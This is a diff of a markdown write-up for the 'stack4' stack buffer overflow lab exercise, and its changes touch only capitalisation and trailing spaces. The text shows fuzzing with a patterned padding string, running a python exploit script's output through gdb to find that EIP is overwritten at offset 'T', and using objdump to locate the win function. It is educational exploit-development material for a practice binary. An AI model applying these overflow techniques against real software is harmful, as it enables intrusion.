@@ -27,18 +27,18 @@ int main(int argc, char **argv)
 ```
 
 ## Fuzzing
-- modify the previous exploit we made by make a random padding
+- Modify the previous exploit we made by make a random padding
   ```
   AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
   ```
-- make a **file** from *output* and use this as **input** str in `gdb`  
+- Make a **file** from *output* and use this as **input** str in `gdb`  
 ```
 python stack4.py > stack4_exp
 gdb stack4
 r < stack4_exp
 info registers
 ```
-- We got a segfault
+- We got a segfault  
 ![segfault](segfault.png)  
 - We can see it segfaulted at `ebp` = `0x53535353` this is `S` and `eip` = `0x54545454` and this is character `T`
 - Run `objdump -t stack4` and find win `objdump -t stack4 | grep win`
